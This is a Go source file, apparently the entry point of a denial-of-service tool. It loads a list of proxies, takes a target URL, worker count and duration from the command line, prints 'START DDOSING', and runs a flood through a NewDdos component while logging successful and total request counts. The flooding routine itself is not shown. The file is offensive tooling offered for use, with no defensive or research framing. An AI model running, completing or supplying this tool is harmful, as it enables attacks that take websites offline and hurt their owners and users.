package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"time"
)

func readProxyList() (data []string, err error) {
	f, err := os.Open("proxyes.txt")
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		url := fmt.Sprintf("http://%s", scanner.Text())
		data = append(data, url)
	}
	return

}

func main() {
	url := flag.String("url", "foo", "target url")
	workers := flag.Int("workers", 42, "threads num")
	duratiom := flag.Int("duration", 1000, "duration in seconds")
	flag.Parse()
	proxyList, err := readProxyList()
	fmt.Printf("START DDOSING DURATION %v WORKERS %v URL %v \n", *duratiom, *workers, *url)

	if err != nil {
		log.Fatal(err)
	}
	d, err := NewDdos(*url, *workers, proxyList)
	if err != nil {
		log.Fatal(err)
	}

	d.Run()
	s := make(chan bool)
	go func() {
		for {
			select {
			case <-s:
				return
			default:
				success, total := d.Result()
				fmt.Printf("SUCCESS REQUESTS: %v, TOTAL REQUESTS: %v \n", success, total)
				time.Sleep(5 * time.Second)
			}
		}
	}()
	time.Sleep(time.Duration(*duratiom) * time.Second)
	fmt.Printf("STOPING PROCESS \n")
	s <- true
	d.Stop()

}
